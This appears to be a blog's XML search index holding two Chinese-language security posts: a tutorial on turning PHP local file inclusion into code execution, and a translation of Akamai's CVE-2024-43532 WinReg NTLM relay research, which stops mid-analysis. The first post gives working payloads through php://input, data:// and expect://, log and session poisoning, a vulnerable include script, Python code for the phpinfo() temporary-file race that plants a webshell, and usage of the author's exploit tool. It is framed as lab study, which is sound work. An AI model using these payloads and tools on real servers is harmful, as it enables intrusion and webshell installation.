<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>PHP LFI abuse</title>
    <url>/post/20250311023739.html</url>
    <content><![CDATA[<h1 id="LFI：-Local-File-Inclusion-文件包含漏洞"><a href="#LFI：-Local-File-Inclusion-文件包含漏洞" class="headerlink" title="LFI： Local File Inclusion 文件包含漏洞"></a>LFI： Local File Inclusion 文件包含漏洞</h1><h1 id="LFI-常见利用方式"><a href="#LFI-常见利用方式" class="headerlink" title="LFI 常见利用方式"></a>LFI 常见利用方式</h1><p>利用LFI实现code execution的关键是能够把文件写入服务器上的本地文件中，常见的方法有：</p>
<ol>
<li><p>包含上传的文件：这是最直接的方式，利用网站的文件上传功能（例如头像上传），上传包含PHP代码的文件（伪装成图片等），然后通过LFI漏洞包含该文件，难点是需要找到文件保存的位置</p>
</li>
<li><p><code>php://</code>伪协议：php伪协议是PHP提供的特殊协议,  可阅读这里： <a href="/post/20250311021811.html" title="PHP Wrapper 利用">PHP Wrapper 利用</a></p>
<ol>
<li><code>php://filter/convert.base64-encode/resource=/etc/passwd</code>常被用来绕过直接文件路径访问的限制</li>
<li><code>php://input</code>会读取原始POST请求体,在post数据中嵌入php代码， 会将POST数据作为输入流包含，从而实现代码执行，如</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /vuln.php?file=php://input HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 20</span><br><span class="line"></span><br><span class="line">&lt;?php system(&#x27;id&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>

<ol>
<li><code>data://</code>允许以数据流形式提供内容, 如 <code>data://text/plain,&lt;?php system(&#39;id&#39;); ?&gt;&quot;)</code>可以直接在URL中嵌入php代码，一般常用方式还有使用base64编码绕过</li>
<li><code>file://</code>是默认的文件访问协议, 如 <code>file:///etc/passwd</code>可以读取本地文件，但是无法直接执行代码</li>
<li><code>excepct://</code>允许执行指定命令，并将输出作为输入流，如 <code>excepect://whoami</code>直接执行系统命令</li>
</ol>
</li>
<li><p>包含日志文件：如果我们能够读取像httpd service log、ssh log的权限的话，可以通过向其中注入恶意代码的方式来利用，前提是需要有权限，因为日志文件通常在server 根目录外</p>
</li>
<li><p><code>proc/self/environ</code>：Linux系统中程序运行时环境变量（包括HTTP头），在请求中将php代码放入Header中（如User-Agent), 然后通过LFI包含 <code>proc/self/environ</code></p>
</li>
<li><p>包含 session file: 通过会话投毒控制会话内容，将php代码注入session文件中，和包含日志文件类似需要知道会话文件位置和名称，并且需要有足够权限</p>
</li>
</ol>
<h1 id="LFI临时文件"><a href="#LFI临时文件" class="headerlink" title="LFI临时文件"></a>LFI临时文件</h1><p>如果我们无法手动上传文件也无法找到可以利用的文件，还有一种利用方式是利用临时文件包含，达到执行命令的目的。</p>
<h2 id="LFI2RCE-via-PHPinfo"><a href="#LFI2RCE-via-PHPinfo" class="headerlink" title="LFI2RCE via PHPinfo()"></a>LFI2RCE via PHPinfo()</h2><p>在2011年INSOMNIASEC公布的Research Paper中，基于<a href="https://www.google.com/search?q=Gynvael+Coldwind">Gynvael Coldwind</a>提出的<a href="https://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf">PHP_LFI_rfc1867_temporary_files</a>提出来针对PHPinfo()上传文件的攻击方式：<a href="https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf">LFI WITH PHPINFO() ASSISTANCE</a>, 在Paper中给出了完整的在linux环境下的利用代码。</p>
<h2 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h2><ul>
<li>file_uploads: on（php 4.3起默认开始）</li>
<li>phpinfo() accessable</li>
<li>LFI Vulnerablity</li>
</ul>
<h2 id="利用过程："><a href="#利用过程：" class="headerlink" title="利用过程："></a>利用过程：</h2><p>当我们通过POST请求向任意PHP文件上传文件时，PHP都会accept, 并把它存储在一个临时文件夹下，直到当前request完全结束时，会把这个临时文件删除，如果我们可以在请求结束之前获取到文件路径和临时文件名(linux下通常是 <code>/tmp/php[6*random digits]</code>，Windows下一般是 <code>C:\Windows\Temp</code>, 具体路径可以在upload_tmp_dir中指定)，那么就可以通过LFI来利用它。</p>
<p>这种方式的挑战在于时间窗口，临时文件在脚本执行结束后会被删除，攻击需要在文件存在期间完成，需要在临时文件被删除之前找到它并成功执行LFI包含。<br><img data-src="https://thiiiiink.com/202509/PHP-LFI-abuse-race.webp.webp"></p>
<h3 id="Windows-FindFirstFile"><a href="#Windows-FindFirstFile" class="headerlink" title="Windows FindFirstFile"></a>Windows FindFirstFile</h3><p>Gynvael Coldwind使用 <code>FindFirstFile quirk</code>在Windows环境下来找到上传的临时文件，<code>FindFirstFile</code>是Windows API的一个函数，用于查找指定目录中匹配某个pattern的第一个文件，在Windows下，当php执行文件包含操作（include或require）时，底层会调用包括 <code>FindFirstFile</code>在内的Windows的文件系统API来解析和定位目标文件。而文件包含支持通配符： <code>&lt;</code>表示 <code>*</code>（任意字符），<code>&gt;</code>表示 <code>?</code>（单个字符）, 因此可以直接在上传文件的同时，请求 <code>/lfi.php?inc=C:\Windows\Temp\php&lt;&lt;</code> 匹配并包含临时文件执行代码。</p>
<h3 id="PHPinfo"><a href="#PHPinfo" class="headerlink" title="PHPinfo()"></a>PHPinfo()</h3><p>但是在GNU&#x2F;Linux下没有类似FindFirstFile的特性，很难在时间窗口内遍历所有随机生成的文件名。然而当我们向phpinfo() 上传文件时，Phpinfo会输出上下文中所有变量，在PHP Variables部分可以直接看到所上传临时文件的信息，其中就包含了文件路径和文件名。<br><img data-src="https://thiiiiink.com/202509/PHP-LFI-abuse-phpinfo-race.webp.webp"></p>
<p>PHP使用<a href="https://www.php.net/manual/en/outcontrol.configuration.php#ini.output-buffering">缓冲区 buffering</a>来提高数据传输效率，默认情况下buffer被启用，大小被设置为4096。当返回数据超出设定的buffer大小时，会采用<a href="https://en.wikipedia.org/wiki/Chunked_transfer_encoding">分块传输Chunk</a>的方式返回部分内容。只要我们能保证phpinfo()返回的数据会远大于这个阈值，就可以增加请求处理的时间，我们在请求内容和请求头中增加大量的垃圾数据，然后使用Scoket控制单次读取的大小，再成功获取到tmpdir和file name之后，立即请求LFI包含临时文件，利用时间差达到远程代码执行的目的。</p>
<p>代码核心部分如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># phpinforeq 为 POST /phpinfo.php?a=xx 用来上传文件，文中是在/tmp/g文件中写入webshell</span></span><br><span class="line"><span class="comment"># lfireq 为 GET /lfi.php?file=xx 用来请求临时文件，执行任务代码</span></span><br><span class="line"><span class="comment"># offset：临时文件名tmp_name在phpinfo()返回信息的所处chunk的偏移位置，用来定位需要socket.recv多少次可以读到tmp_name</span></span><br><span class="line"><span class="comment"># tag: 在文中为： Security Test, 在请求文件包含后用来校验代码有没有被执行成功</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phpInfoLFI</span>(<span class="params">host, port, phpinforeq, offset, lfireq, tag</span>):</span><br><span class="line">    <span class="comment"># 使用原生的socket，控制在读到tmp_name后立即尝试执行文件包含</span></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  </span><br><span class="line"></span><br><span class="line">    s.connect((host, port))</span><br><span class="line">    s2.connect((host, port))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 上传恶意代码，文中是在/tmp/g文件中写入webshell，读取临时文件路径</span></span><br><span class="line">    s.send(phpinforeq)</span><br><span class="line">    d = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 根据offset读取到包含tmp_name所处位置的数据</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(d) &lt; offset:</span><br><span class="line">        d += s.recv(offset)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        i = d.index(<span class="string">&quot;[tmp_name] =&gt; &quot;</span>) <span class="comment"># offset实际上也是使用index()获取的基础值+256的padding</span></span><br><span class="line">        fn = d[i+<span class="number">17</span>:i+<span class="number">31</span>] <span class="comment"># 截取临时文件名</span></span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 立即执行文件包含执行恶意代码</span></span><br><span class="line">    s2.send(lfireq % (fn, host))</span><br><span class="line">    d = s2.recv(<span class="number">4096</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    s2.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.find(tag) != -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> fn</span><br></pre></td></tr></table></figure>

<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><blockquote>
<p>感谢：<a href="https://github.com/vulhub/vulhub/tree/master/php/inclusion">https://github.com/vulhub/vulhub/tree/master/php/inclusion</a></p>
</blockquote>
<p>克隆项目后 <code>docker compose up -d</code> 启动docker环境</p>
<p>LFI：<a href="http://127.0.0.1:8000/lfi.php?file=xxx">http://127.0.0.1:8000/lfi.php?file=xxx</a></p>
<p>Phpinfo: <a href="http://127.0.0.1:8000/phpinfo.php">http://127.0.0.1:8000/phpinfo.php</a></p>
<p>执行作者准备好的exp: <code>python2 exp.py 127.0.0.1 8000</code>即可成功上传webshell, exp基本和paper中提供的一样，除了修改了上传文件名和webshell的参数名，作者在README中对漏洞原理介绍也很清晰明了</p>
<h3 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h3><p>执行exp: <code>python2 exp.py 127.0.0.1 8000</code>, 执行了几次后发现无法成功，在lfi.php中增加错误信息输出：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>排查过程中发现了另一个问题，在exp.py所在目录下创建test.txt文件 <code>http://127.0.0.1:8000/lfi.php?file=``test.txt</code>可以正常include</p>
<p>但是直接在&#x2F;tmp目录下新建test.txt后 <code>http://127.0.0.1:8000/lfi.php?file=``/tmp/test.txt</code>返回错误：</p>
<p> <strong><code>Warning</code></strong> <code>: include(/tmp/test.txt): Failed to open stream: No such file or directory in </code><strong><code>/var/www/html/lfi.php</code></strong><code>on line</code><strong><code>4</code></strong></p>
<p>但是&#x2F;tmp&#x2F;test.txt明明存在，后来发现是 <a href="https://qkxu.github.io/2022/03/16/systemd%E4%B9%8BPrivateTmp.html">PrivateTmp</a>的问题，简单说就是apache2进程是systemd启动的，systemd会因为安全性考虑，在privatetmp&#x3D;true的情况下，不使用公用的&#x2F;tmp目录以及&#x2F;var&#x2F;tmp，进程用于自己的独立的目录以及相应的权限。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /lib/systemd/system/apache2.service | grep PrivateTmp</span><br><span class="line">PrivateTmp=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line">systemctl daemon-reload</span><br><span class="line"><span class="built_in">sudo</span> systemctl restart apache2</span><br></pre></td></tr></table></figure>

<p>最终发现只是因为成功率比较低，失败的话多执行几次就可以了 ：)</p>
<h1 id="lif-abuse-py"><a href="#lif-abuse-py" class="headerlink" title="lif_abuse.py"></a>lif_abuse.py</h1><blockquote>
<p><a href="https://github.com/Yiaos/php_lfi_abuse">https://github.com/Yiaos/php_lfi_abuse</a></p>
</blockquote>
<p>基于paper中的实现，抄袭众多github lfi相关代码做了一些简单优化：</p>
<ol>
<li>使用python3</li>
<li>支持-lfi和-phpinfo参数中指定lfi和phpinfo路径</li>
<li>支持windows和linux系统下此方式的利用 -platform可指定平台，同时支持-tmp_dir指定临时目录地址</li>
<li>获取临时文件名从硬编码长度方式改为正则匹配获取以适应不同平台的场景</li>
<li>抄袭<a href="https://github.com/roughiz/lfito_rce">lfito_rce</a>、<a href="https://github.com/takabaya-shi/LFI2RCE">LFI2RCE</a>、<a href="https://github.com/0bfxgh0st/lfi2rce">lfi2rce</a>支持枚举日志文件、系统文件</li>
</ol>
<h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python lfi_abuse.py &lt;host&gt; &lt;port&gt; -lfi &lt;lfi_path&gt; [options]</span><br></pre></td></tr></table></figure>

<p>利用LFI和phpinfo()写入webshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python lfi_abuse.py <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">80</span> -lfi <span class="string">&quot;/lfi.php?file=&quot;</span> -p <span class="string">&quot;linux&quot;</span> -tmp_dir <span class="string">&quot;/tmp&quot;</span> -phpinfo <span class="string">&quot;/phpinfo.php&quot;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://thiiiiink.com/202509/PHP-LFI-abuse-enum-1.webp.webp"></p>
<p>利用LFI枚举信息</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python lfi_abuse.py <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">80</span> -lfi <span class="string">&quot;/lfi.php?file=&quot;</span> -enum-files -p <span class="string">&quot;linux&quot;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://thiiiiink.com/202509/PHP-LFI-abuse-enum.webp.webp"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li>INSOMNIASEC Research Paper: <a href="https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf">https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf</a></li>
<li>Gynvael Coldwind LFI原文： <a href="https://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf">https://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf</a></li>
<li>Github Repositories:<ol>
<li><a href="https://github.com/vulhub/vulhub/tree/master/php/inclusion">https://github.com/vulhub/vulhub/tree/master/php/inclusion</a></li>
<li><a href="https://github.com/roughiz/lfito_rce">https://github.com/roughiz/lfito_rce</a></li>
<li><a href="https://github.com/takabaya-shi/LFI2RCE">https://github.com/takabaya-shi/LFI2RCE</a></li>
<li><a href="https://github.com/0bfxgh0st/lfi2rce">https://github.com/0bfxgh0st/lfi2rce</a></li>
</ol>
</li>
<li>phpwrap: <a href="https://www.angelwhu.com/paper/2016/06/13/phpinfo-lfi-upload-shell/#0x00-%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86">https://www.angelwhu.com/paper/2016/06/13/phpinfo-lfi-upload-shell/#0x00-%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86</a></li>
<li><a href="https://qkxu.github.io/2022/03/16/systemd%E4%B9%8BPrivateTmp.html">https://qkxu.github.io/2022/03/16/systemd%E4%B9%8BPrivateTmp.html</a></li>
<li><a href="https://abdelhameedghazy.medium.com/5-ways-to-chain-lfi-2-rce-with-default-configurations-in-php-4d3b839a4cc3">https://abdelhameedghazy.medium.com/5-ways-to-chain-lfi-2-rce-with-default-configurations-in-php-4d3b839a4cc3</a></li>
</ol>
]]></content>
      <categories>
        <category>How It Works-临渊羡鱼</category>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2024-43532-译</title>
    <url>/post/20241110205111.html</url>
    <content><![CDATA[<h1 id="简述："><a href="#简述：" class="headerlink" title="简述："></a>简述：</h1><ol>
<li>Microsoft Remote Registry Service是Windows操作系统中的一个服务，允许远程用户通过网络访问和修改计算机上的注册表。</li>
<li>由于Microsoft Remote Registry客户端在SMB传输不可用的情况下回退到RPC认证时，切换到较旧的协议并采用弱认证级别，该级别无法验证通信的完整性或来源，攻击者可利用该缺陷，通过拦截 NTLM 身份验证握手并将其中继到其他服务，实现NTLM中继攻击，进而可能创建域管理员账户或 <strong>接管整个域</strong> 。</li>
</ol>
<h1 id="影响范围："><a href="#影响范围：" class="headerlink" title="影响范围："></a>影响范围：</h1><p>所有运行Windows Server版本的操作系统，包括2008到2022版及Window 10&#x2F;11。</p>
<span id="more"></span>

<h1 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h1><blockquote>
<p><a href="https://github.com/akamai/akamai-security-research/tree/main/PoCs/cve-2024-43532">https://github.com/akamai/akamai-security-research/tree/main/PoCs/cve-2024-43532</a></p>
</blockquote>
<h1 id="Call-and-Register-—-Relay-Attack-on-WinReg-RPC-Client"><a href="#Call-and-Register-—-Relay-Attack-on-WinReg-RPC-Client" class="headerlink" title="Call and Register — Relay Attack on WinReg RPC Client"></a>Call and Register — Relay Attack on WinReg RPC Client</h1><p>调用并注册——WinReg RPC 客户端的中继攻击</p>
<blockquote>
<p>原文：<a href="https://www.akamai.com/blog/security-research/winreg-relay-vulnerability">https://www.akamai.com/blog/security-research/winreg-relay-vulnerability</a></p>
</blockquote>
<h2 id="Executive-summary-执行摘要"><a href="#Executive-summary-执行摘要" class="headerlink" title="Executive summary 执行摘要"></a>Executive summary 执行摘要</h2><ul>
<li>Akamai 研究员 Stiv Kupchik 在 Microsoft 远程注册表客户端中发现了一个新的特权提升 (EoP) 漏洞 CVE-2024-43532，CVSS 评分为 8.8。</li>
<li>该漏洞滥用 WinReg 客户端实现中的后备机制，如果 SMB 传输不可用，该机制将不安全地使用过时的传输协议。</li>
<li>通过利用此漏洞，攻击者可以将客户端的 NTLM 身份验证详细信息中继到 Active Directory 证书服务 (ADCS)，并请求用户证书以在域中进行进一步身份验证。我们在<a href="https://github.com/akamai/akamai-security-research/tree/main/PoCs/cve-2024-43532"> GitHub</a>存储库中提供了概念证明。</li>
<li>该漏洞已于 2024 年 2 月负责任地向 Microsoft 安全资源中心披露，并作为 2024 年 10 月补丁星期二的一部分进行了修补。</li>
<li>该漏洞影响所有未修补的 Windows 版本。</li>
<li>我们的研究结果也在<a href="https://www.nohat.it/talks"> No Hat 计算机安全会议</a>上公布。</li>
</ul>
<h2 id="Introduction介绍"><a href="#Introduction介绍" class="headerlink" title="Introduction介绍"></a>Introduction介绍</h2><p>MS-RPC 是 Microsoft 对远程过程调用 (RPC) 协议和标准的实现。 RPC 是一种进程间通信机制，允许进程公开其他进程可以调用的功能。它是 Windows 操作系统的核心组件，多种服务都依赖于它 — 从服务管理器到<a href="https://www.akamai.com/blog/security-research/cant-wait-to-shut-you-down-msrpc-wininit"> wininit 中的关闭</a>。</p>
<p>我们的团队对 MS-RPC 进行了大量研究，包括<a href="https://www.akamai.com/blog/security-research/cold-hard-cache-bypassing-rpc-with-cache-abuse">攻击性</a>研究（我们发现了缓存攻击形式的大型攻击向量）和<a href="https://www.akamai.com/blog/security/guide-rpc-filter">防御性</a>研究（我们分析了其安全机制）。</p>
<p>这一次，我们想从不同的角度来看待 RPC。任何允许不同计算机之间进行通信和操作的协议都必须涉及用户身份验证，实际上 RPC 协议支持传递凭据和身份验证作为其绑定过程的一部分。然而，只要有身份验证，就有身份验证中继的潜力，因此我们开始寻找中继机会。</p>
<h2 id="RPC-authentication-and-what’s-in-betweenRPC、身份验证以及介于两者之间的内容"><a href="#RPC-authentication-and-what’s-in-betweenRPC、身份验证以及介于两者之间的内容" class="headerlink" title="RPC, authentication, and what’s in betweenRPC、身份验证以及介于两者之间的内容"></a>RPC, authentication, and what’s in betweenRPC、身份验证以及介于两者之间的内容</h2><p>RPC sessions are handled by  <em>bindings</em> . A client application connects to a server application, binds to the required RPC interface, and requests to run a specific function (Figure 1).RPC 会话由绑定处理。客户端应用程序连接到服务器应用程序，绑定到所需的 RPC 接口，并请求运行特定功能（图 1）。</p>
<p><img data-src="https://ve0zkk9dxj.feishu.cn/space/api/box/stream/download/asynccode/?code=OTQ5Yjc4YTQxYjI1NWMzODRkZWU1MGU2NjU4YjgyNjZfN1lMU3FvVXRteHBmWjAyOXBJWG1NN2ZXaXlsZlYxUFdfVG9rZW46WFY3NWJoV3hRb0ZIQ1F4QmJTdWNNMWhxbmhmXzE3MzEyNTUwNzM6MTczMTI1ODY3M19WNA"></p>
<p>Fig. 1: The basic RPC call process 图1：基本的RPC调用流程</p>
<p>The bind request and response can carry over multiple fields of data, as required for the connection. Normally, if there’s no authentication involved, the RPC binding is simply used to decide on the <a href="https://learn.microsoft.com/en-us/windows/win32/rpc/transfer-syntax-and-ndr64">transfer syntax</a> that will be used to encapsulate function parameters on subsequent calls.绑定请求和响应可以根据连接的需要携带多个数据字段。通常，如果不涉及身份验证，则 RPC 绑定仅用于决定将用于封装后续调用中的函数参数的传输语法。</p>
<p>What’s missing from this interaction? Authentication, of course! How can the server know the client’s identity and whether that client is allowed to perform the requested action? The answer is: It doesn’t, unless the client specifically added security context (authentication) to the binding. By default, all RPC connections are unauthenticated, and not all RPC servers actually require authentication.这种互动缺少什么？当然是认证啦！服务器如何知道客户端的身份以及是否允许该客户端执行请求的操作？答案是：不会，除非客户端专门向绑定添加了安全上下文（身份验证）。默认情况下，所有 RPC 连接都未经身份验证，并且并非所有 RPC 服务器实际上都需要身份验证。</p>
<p>To authenticate (or, in RPC terms, “add security context”), the client has to add additional data to the binding request, negotiate authentication protocol (for example, NTLM or Kerberos), and insert additional metadata required by the authentication protocol (like username, domain, etc.; Figure 2).为了进行身份验证（或者用 RPC 术语来说，“添加安全上下文”），客户端必须向绑定请求添加其他数据、协商身份验证协议（例如 NTLM 或 Kerberos），并插入身份验证协议所需的其他元数据（如用户名、域等；图 2)。</p>
<p><img data-src="https://ve0zkk9dxj.feishu.cn/space/api/box/stream/download/asynccode/?code=YmY4MWUxZjEyY2M3NmZkMjMyZGQ0YTZkNDQ2MDU5MjJfM1J6elJ3d1E5OUJRaFRETDlxa2dQV21hbWtLM2V6RnJfVG9rZW46UkhaeGI4UXplb0ZGWkd4YmZnVmNRZ2tJbllEXzE3MzEyNTUwNzM6MTczMTI1ODY3M19WNA"></p>
<p>Fig 2: Authentication metadata added to RPC binding request图 2：添加到 RPC 绑定请求的身份验证元数据</p>
<h2 id="Finding-research-targets寻找研究目标"><a href="#Finding-research-targets寻找研究目标" class="headerlink" title="Finding research targets寻找研究目标"></a>Finding research targets寻找研究目标</h2><p>The first order of business is understanding how authentication should look from an API standpoint. This is done by a call to one of the <a href="https://learn.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcbindingsetauthinfoa">RpcBindingSetAuthInfo*</a> functions from the client after creating a binding handle. If you look at the documentation of these functions, you’ll notice a field called <a href="https://learn.microsoft.com/en-us/windows/win32/rpc/authentication-level-constants">AuthenticationLevel</a>; it indicates the level of security the authentication provides.第一个任务是从 API 的角度理解身份验证应该如何看待。这是通过在创建绑定句柄后从客户端调用 RpcBindingSetAuthInfo* 函数之一来完成的。如果您查看这些函数的文档，您会注意到一个名为 AuthenticationLevel 的字段；它指示身份验证提供的安全级别。</p>
<p>Security with authentication is more than just verifying that the user exists and is authorized, it can also be used to prevent tampering. The authentication levels vary from simply verifying the connection succeeded (RPC_C_AUTHN_LEVEL_CONNECT) to fully encrypting and signing all the traffic to ensure nothing is tampered (RPC_C_AUTHN_LEVEL_PKT_PRIVACY). Of course, attackers would be interested in the former level, no defenses on the traffic, which means it’s tamperable.身份验证的安全性不仅仅是验证用户存在和授权，它还可以用于防止篡改。身份验证级别各不相同，从简单地验证连接是否成功 (RPC_C_AUTHN_LEVEL_CONNECT) 到完全加密和签署所有流量以确保任何内容不被篡改 (RPC_C_AUTHN_LEVEL_PKT_PRIVACY)。当然，攻击者会对前一个级别感兴趣，对流量没有防御，这意味着它是可篡改的。</p>
<p>Yet the story isn’t so simple. RPC relay attacks are not a new concept, so a lot of the RPC clients and servers in Windows were already patched to use the highest level of authentication to ensure relay attacks can’t succeed. We’ll need to scour the operating system in hopes of finding some older nuggets of code that are still insecure for some reason (Figure 3).然而故事并不那么简单。 RPC 中继攻击并不是一个新概念，因此 Windows 中的许多 RPC 客户端和服务器已经打了补丁，以使用最高级别的身份验证来确保中继攻击不会成功。我们需要搜索操作系统，希望找到一些由于某种原因仍然不安全的旧代码块（图 3）。</p>
<p><img data-src="https://ve0zkk9dxj.feishu.cn/space/api/box/stream/download/asynccode/?code=YmQwYTc5NGQzZWEyMTZlYWM4MWRlMzEyODNmMWVkY2VfbUhxVHJkMGFEb1ZEZWpITjNMSVVUOEMweEc2WFhqYlFfVG9rZW46QnhmN2JnYlk3b1VmY3R4NWd5Z2N4NnBhbnBmXzE3MzEyNTUwNzM6MTczMTI1ODY3M19WNA"></p>
<p>Fig. 3: Running an IDAPython script on the system32 folder of a Windows server to find instances of RPC insecure authentication; the script can be found in our GitHub repository图 3：在 Windows 服务器的 system32 文件夹上运行 IDAPython 脚本以查找 RPC 不安全身份验证的实例；该脚本可以在我们的 GitHub 存储库中找到</p>
<h2 id="WinReg-—-A-promising-candidateWinReg——一个有前途的候选者"><a href="#WinReg-—-A-promising-candidateWinReg——一个有前途的候选者" class="headerlink" title="WinReg — A promising candidateWinReg——一个有前途的候选者"></a>WinReg — A promising candidateWinReg——一个有前途的候选者</h2><p>As suspected, the list of potential targets that we found included less than 5% of the total RPC servers and clients; most simply do not use insecure authentication anymore. But we found a promising candidate in  <em>advapi32.dll</em> .正如所怀疑的，我们发现的潜在目标列表中不到 RPC 服务器和客户端总数的 5%；最简单的是不再使用不安全的身份验证。但我们在 advapi32.dll 中找到了一个有前途的候选者。</p>
<p><em>advapi32.dll</em> is a core component of Windows API, and implements a lot of the “advanced” logic in Windows (as its name suggests). It exports more than 800 functions from various fields: event logging, encryption, WMI, and more.advapi32.dll是Windows API的核心组件，实现了Windows中的许多“高级”逻辑（顾名思义）。它导出来自各个领域的 800 多个功能：事件记录、加密、WMI 等。</p>
<p>For our purposes, we’ve found that, on some occasions, the internal function <em>BaseBindToMachine</em> calls <em>RpcBindingSetAuthInfoA</em> with an authentication level of RPC_C_AUTHN_LEVEL_CONNECT, which is what we want. <em>BaseBindToMachine</em> is called by the exported (though undocumented) function <em>RegConnectRegistryExW</em> (Figure 4), if it receives a UNC path for a machine name.出于我们的目的，我们发现，在某些情况下，内部函数 BaseBindToMachine 会使用 RPC_C_AUTHN_LEVEL_CONNECT 的身份验证级别调用 RpcBindingSetAuthInfoA，这正是我们想要的。如果 BaseBindToMachine 收到计算机名称的 UNC 路径，则由导出的（尽管未记录的）函数 RegConnectRegistryExW（图 4）调用它。</p>
<p><img data-src="https://ve0zkk9dxj.feishu.cn/space/api/box/stream/download/asynccode/?code=NGYzZWU3NTQxMTU0NTNiYmEyNDMwMzE4MDk3MWE1ZjRfcjgwMFN5THBlbk1aOHlHckE0SDVkQjhETnBsSFRWaWxfVG9rZW46WDR5c2JZcE1xb1dsZ0F4a3BsMGNINmtrblllXzE3MzEyNTUwNzM6MTczMTI1ODY3M19WNA"></p>
<p>Fig. 4: The Rust documentation for RegConnectRegistryExW, as it is undocumented in MSDN图 4：RegConnectRegistryExW 的 Rust 文档，因为 MSDN 中没有记录它</p>
<p>By looking at  <em>BaseBindToMachine</em> , we can see that it actually contains calls to both <em>RpcBindingSetAuthInfoW</em> and  <em>RpcBindingSetAuthInfoA</em> . The former is used securely, with authentication level RPC_C_AUTHN_LEVEL_PKT_PRIVACY, while the latter uses authentication level RPC_C_AUTHN_LEVEL_CONNECT, which can be relayed as it doesn’t verify authenticity or integrity of the connection (Figure 5).通过查看BaseBindToMachine，我们可以看到它实际上包含对RpcBindingSetAuthInfoW和RpcBindingSetAuthInfoA的调用。前者使用安全，身份验证级别为 RPC_C_AUTHN_LEVEL_PKT_PRIVACY，而后者使用身份验证级别 RPC_C_AUTHN_LEVEL_CONNECT，可以中继，因为它不验证连接的真实性或完整性（图 5）。</p>
<p><img data-src="https://ve0zkk9dxj.feishu.cn/space/api/box/stream/download/asynccode/?code=NDBmZGI5N2ZlNTcwODY1ZjYyZGU0Zjc0ZmJhZjNkZWJfU2F4bEd6ZGNLUXZPSnM0c2dJZjR1SDgydDBIU0hsTFNfVG9rZW46SkY0VWJ1ZVhRb0NkeVp4dW5scWM1ZkM4bjNiXzE3MzEyNTUwNzM6MTczMTI1ODY3M19WNA"></p>
<p>Fig. 5: The two calls to set authentication info图 5：设置身份验证信息的两次调用</p>
<p>We just need to figure out why there are two conflicting calls. Looking at the function logic, we can see that it has a function pointer variable and an array of functions (Figure 6). Those functions set the RPC binding info to use a specific RPC transport; by default it attempts to use SMB and named pipes — but, if it fails, it attempts to bind over SPX, TCP&#x2F;IP, and others.我们只需要弄清楚为什么会有两个相互冲突的调用。查看函数逻辑，我们可以看到它有一个函数指针变量和一个函数数组（图6）。这些函数设置 RPC 绑定信息以使用特定的 RPC 传输；默认情况下，它会尝试使用 SMB 和命名管道，但如果失败，它会尝试通过 SPX、TCP&#x2F;IP 等进行绑定。</p>
<p>For some reason, once it falls back to any other protocol besides SMB, it uses <em>RpcBindingSetAuthInfoA</em> to set the authentication level to Connect, which is insecure.由于某种原因，一旦它回退到 SMB 之外的任何其他协议，它就会使用 RpcBindingSetAuthInfoA 将身份验证级别设置为 Connect，这是不安全的。</p>
